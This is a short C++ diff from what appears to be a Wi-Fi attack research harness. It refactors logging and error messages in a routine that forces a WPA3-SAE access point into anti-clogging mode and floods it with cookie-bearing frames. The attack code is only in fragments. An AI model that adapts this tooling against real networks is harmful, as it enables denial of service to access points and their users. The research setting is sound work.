@@ -91,7 +91,7 @@ pair<ACMCookie,int> trigger_acm(const string &iface, const string &att_mac, cons
 			return {get<ACMCookie>(result), i};
 		}
 	}
-	throw run_err("ACM not activated after " + to_string(trigger_count) + " frames");
+	throw run_err("ACM not activated after {} frames", trigger_count);
 }
 
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
@@ -140,12 +140,12 @@ void run_attack(RunStatus &rs){
 	const auto ssid = rs.config().at("actors").at("access_point").at("setup").at("program_config").at("ssid").get<
 		string>();
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, att.get(SK::iface), att.get(SK::sniff_iface), ssid, ap["mac"], 30);
+		rs, att.get(SK::iface), att.get(SK::sniff_iface), ssid, ap.get(SK::mac), 30);
 	att->set_monitor_mode();
 	att->set_iface_up();
 
 	//  force AP into ACM mode
-	rs.process_manager.write_log_all("@attack_stark");
+	rs.process_manager.write_log_all(ATTACK_START_tag);
 	trigger_acm(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), trigger_count, sae_params.value());
 	rs.process_manager.write_log_all("@AKM_trigger");
 	rs.start_observers();
@@ -167,7 +167,7 @@ void run_attack(RunStatus &rs){
 		if(capture_thread.joinable()) capture_thread.join();
 		throw;
 	}
-	rs.process_manager.write_log_all("@attack_stop");
+	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 
 	if(capture_thread.joinable()) capture_thread.join();
 	ap->conn->disconnect();
